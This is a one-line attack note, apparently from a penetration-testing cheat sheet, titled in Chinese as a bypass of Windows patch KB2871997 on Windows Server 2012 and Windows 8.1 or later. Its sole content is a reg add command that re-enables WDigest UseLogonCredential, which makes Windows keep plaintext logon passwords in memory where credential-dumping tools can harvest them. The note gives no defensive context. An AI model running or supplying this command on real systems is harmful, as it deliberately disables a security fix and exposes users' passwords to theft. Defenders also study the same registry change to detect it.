# 大于等于WIndows2012WIn8.1(家庭版)补丁KB2871997绕过

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG\_DWORD /d 1 /f
